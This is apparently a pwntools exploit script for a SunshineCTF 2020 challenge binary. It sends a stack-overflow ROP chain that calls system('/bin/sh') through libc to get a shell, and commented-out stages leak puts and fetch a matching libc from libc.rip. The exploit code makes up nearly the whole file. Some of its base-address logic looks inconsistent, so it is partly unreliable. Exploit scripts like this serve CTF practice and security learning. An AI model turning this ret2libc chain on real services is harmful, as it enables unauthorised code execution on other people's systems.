from pwn import *
binary = context.binary = ELF('./chall_14')

libc_index = 1
#p = remote('chal.2020.sunshinectf.org',30014)
p = process(binary.path)
libc = binary.libc

rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

'''
payload = 0x68*b'A'
payload += p64(pop_rdi)
payload += p64(binary.sym.puts)
payload +=p64(binary.sym.puts)
payload += p64(binary.sym.main)


#p.sendlineafter('You can hear the sound of a thousand...\n','IxZ')
p.sendline('IxZ')
p.sendline(payload)

rec = p.recv(6)
puts = u64(rec+b'\0\0')
p.interactive()
'''
'''
print('puts: ' + hex(puts))
print('puts sym: '+ hex(binary.sym.puts))

if not 'libc' in locals():
    import requests
    r = requests.post('https://libc.rip/api/find',json = {'symbols':{'puts':hex(puts)[-3:]}})
    libc_url = r.json()[libc_index]['download_url']
    libc_file = libc_url.split('/')[-1:][0]
    if not os.path.exists(libc_file):
        log.info('getting: ' + libc_url)
        r = requests.get(libc_url,allow_redirects=True)
        open(libc_file,'wb').write(r.content)

    libc = ELF(libc_file)
print('pre libc.address: ',libc.address)
print('sym.puts: ',libc.sym.puts)
print('binary.got.puts: ',binary.got.puts)

'''

print('binary sym puts: ', binary.sym.puts)
print('libc sym puts: ',libc.sym.puts)
libc.address = binary.sym.puts - libc.sym.puts
log.info('libc.address: '+hex(libc.address))

payload = 0x68*b'A'
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(libc.search(b'/bin/sh').__next__())
payload += p64(libc.sym.system)
p.sendlineafter('You can hear the sound of a thousand...\n','IxZ')
p.sendline(payload)
p.interactive()
